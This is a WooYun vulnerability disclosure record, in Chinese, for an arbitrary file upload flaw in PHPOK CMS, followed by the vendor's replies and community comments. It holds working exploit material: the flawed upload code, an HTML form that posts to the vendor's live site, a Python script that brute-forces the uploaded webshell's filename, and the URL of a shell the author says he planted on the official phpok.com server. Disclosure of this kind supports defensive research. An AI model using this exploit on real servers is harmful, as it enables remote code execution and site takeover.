{"id": 2865, "wybug_id": "wooyun-2014-063207", "wybug_title": "phpok前台任意文件上传getshell(官网已shell)", "wybug_corp": "phpok.com", "wybug_author": "phith0n", "wybug_date": "2014-06-02 13:54", "wybug_open_date": "2014-07-17 15:29", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向公众公开  简要描述： 另一个更好用的0day已经没了，把这个也放出来，官网已shell。 详细说明：  /framework/www/upload_control.php第45行：\nfunction base_f()\t{\t\t$rs = $this->upload_base(\"Filedata\");\t\tif($rs[\"status\"] == \"ok\")\t\t{\t\t\terror(\"图片上传成功\",$this->url(\"res\",\"add\"),\"ok\");\t\t}\t\telse\t\t{\t\t\terror($rs[\"error\"],$this->url(\"res\",\"add\"),\"error\");\t\t}\t}\n调用了upload_base，跟进去看看：\nfunction upload_base($input_name = \"Filedata\",$upload_type)\t{\t\t$cateid = $this->get(\"cateid\",\"int\");\t\t$rs = $this->upload($input_name);\t\tif($rs[\"status\"] != \"ok\")\t\t{\t\t\treturn $rs;\t\t}\n调用了$this->upload来上传文件。继续跟进去看看：\nfunction upload($inputname)\t{\t\tif(!$this->ifset) $this->auto_app();\t\tif(!$inputname) return false;\t\t$path = $this->dir_res;\t\tif(!isset($_FILES[$inputname]))\t\t{\t\t\treturn array(\"status\"=>\"error\",\"error_id\"=>\"1001\",\"error\"=>\"没有指定上传的图片\");\t\t}\t\t//生成新的文件名称\t\t$file_name = substr(md5(time().rand(0,9999)),9,16);\t\t$zip_filename = $file_name;//如果是zip压缩包\t\t$path_info = pathinfo($_FILES[$inputname]['name']);\t\t$file_extension = strtolower($path_info[\"extension\"]);\t\t$file_name .= \".\".$file_extension;\t\t$tmp_title = $_FILES[$inputname]['name'];\t\tif(!@copy($_FILES[$inputname][\"tmp_name\"],$path.$file_name))\t\t{\t\t\treturn array(\"status\"=>\"error\",\"error_id\"=>\"1002\",\"error\"=>\"图片无法复制到指定目录\");\t\t}\t\tif(!in_array($file_extension,$this->file_ext))\t\t{\t\t\treturn array(\"status\"=>\"error\",\"error_id\"=>\"1003\",\"error\"=>\"附件类型不支持\");\t\t}\t\treturn array(\"status\"=>\"ok\",\"title\"=>$tmp_title,\"filename\"=>$path.$file_name,\"ext\"=>$file_extension);\t}\n仔细观察最后两个if语句，第一个是copy，第二个才是判断后缀名。也就是说它先把我上传的任意文件copy到web目录下，再判断了这个文件后缀是否合法。而且判断完毕后并没有删除不合法的文件。所以我们可以利用这一点来上传任意文件，虽然最后我不知道上传后的文件名，但这个文件名是可以爆破出来的。文件名命名规则：substr(md5(time().rand(0,9999)),9,16)取当前时间 和 0-9999之前的随机数的md5值。这个好说，当前时间基本就在发包以后的1~3秒，4位随机数。也就说我只用爆破大概1W到3W次就能找到我上传的文件了。   漏洞证明：  本地构造一个上传单页：\n<form name=\"form\" method=\"post\" action=\"http://www.phpok.com/index.php?c=upload&f=base\" enctype=\"multipart/form-data\" ><input type=\"file\" name=\"Filedata\"><input type=\"submit\" name=\"Submit\" value=\"上传\" ></form>\n拉一个shell点击上传。中途抓包，查看返回包：\n\n可以看到返回包的时间，这个时间基本上就是生成文件名的时候取的time()。通过返回包里的Date计算出此时的时间戳，也就是重命名时候取的time()值（就算不是，相差也不会太大，一两秒内）我计算出的时间戳值为1401619111然后我简单写一个单线程脚本（py需要安装requests库），来跑一下数据包。上传的文件默认放在/res目录下，我们就来爆破一下这个文件名：\nimport requests, hashlibdef md5(str):        m = hashlib.md5()        m.update(str)        return m.hexdigest()time = '1401619111'for x in xrange(0,9999):\ttarget = \"http://localhost/phpok/res/%s.php\" % md5(time + str(x))[9: 9 + 16]\tres = requests.get(target)\tif res.status_code != 404:\t\tprint x, target\t\tbreak\n因为是本地，所以很快就跑出了shell的地址：\n\n访问可见phpinfo：\n\n危害性证明：官网shell地址，也是我跑出来的，运气比较好，随机数比较小，跑了一分钟就出来了http://www.phpok.com/res/49d39bf998b3e28e.php   修复方案：  你猜~   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-03 10:14 厂商回复： 感谢您的意见，我真心没有想到有这么严重问题。我们正在努力处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-02 14:00 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  师傅   首页 走起。    \n     2014-06-02 14:13 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  前排出售瓜子    \n     2014-06-02 14:15 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @roker 我日 敢在我师傅这卖瓜子?    \n     2014-06-02 14:31 |    \t\tSunshie \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:10        | http://phpinfo.me)\t\t \n  前排广告位招租    \n     2014-06-02 14:31 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  师傅就是叼    \n     2014-06-02 14:44 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  多让我上几次首页呀~~    \n     2014-06-02 14:49 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:61        | JDSec)\t\t \n  卖黄瓜~    \n     2014-06-02 14:53 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @phith0n @′  雨。 我错了……    \n     2014-06-02 16:23 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  你啥时候提交的啊。。。我昨天提交了没审核。。。。http://wooyun.org/bugs/wooyun-2014-063106/trace/cdf1cb4597ad11280adbdc024f4ef7fd    \n     2014-06-02 16:38 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  前台上传头像处，可以传shell，但是获取不了文件名，他的文件是随机生成的，还是有规律生成的？    \n     2014-06-03 10:33 |    \t\tphpok企业站(乌云厂商)\t\t \n  我那个狠，哥伤心了，正在处理中    \n     2014-06-03 12:05 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @phpok企业站 “另一个更好用的0day”来了 http://www.wooyun.org/bugs/wooyun-2014-063106/ 一起处理吧:)    \n     2014-06-03 13:36 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @phpok企业站 礼物就不用了，你们处理的很及时很负责，感谢！    \n     2014-06-06 13:42 |    \t\tphpok企业站(乌云厂商)\t\t \n  @索马里的海贼 已确认~安排处理中    \n     2014-06-06 13:43 |    \t\tphpok企业站(乌云厂商)\t\t \n  @phith0n 不及时不行啊，开发这个东东这么多年了，有感情了。公司的全部生活费全靠这个东东    \n     2014-07-17 15:37 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  吊炸天    \n     2014-07-17 15:46 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  4，30天后向实习白帽子公开；5，45天后向公众公开； 师傅 我目测你这个没选择通用型。    \n     2014-07-17 15:57 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @′  雨。 不知道，在哪看？    \n     2014-07-17 16:58 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  吊，来拜读了    \n     2014-07-17 17:00 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n   看你这公开时间就知道啦  让狗哥帮你改改吧 要不没奖金的    \n     2014-07-17 17:18 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  普通漏洞： 1，5天厂商确认周期（5天内未确认视为忽略,直接公开）； 2，10天后向核心及相关领域专家公开； 3，20天后向普通白帽子公开； 4，30天后向实习白帽子公开； 5，45天后向公众公开； 6，期间厂商可自行提前公开，向普通白帽公开的时候可以使用乌云币购买提前查看漏洞细节。 通用型漏洞： 1，5天厂商确认周期（5天内未确认视为忽略,但不公开,直接进入2）； 2，确认3天后对安全合作伙伴公开 3，10天后向核心及相关领域专家公开； 4，20天后向普通白帽子公开； 5，40天后向实习白帽子公开； 6，90天后向公众公开； 7，不支持付乌云币提前查看漏洞。 再对比一下你这公开的时间 就知道没选通用咯。    \n     2014-07-17 19:53 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @′  雨。 似乎我给@疯狗 发信息他都没甩过我 >.<哭瞎了    \n     2014-07-17 20:00 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @phith0n 给改过来了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}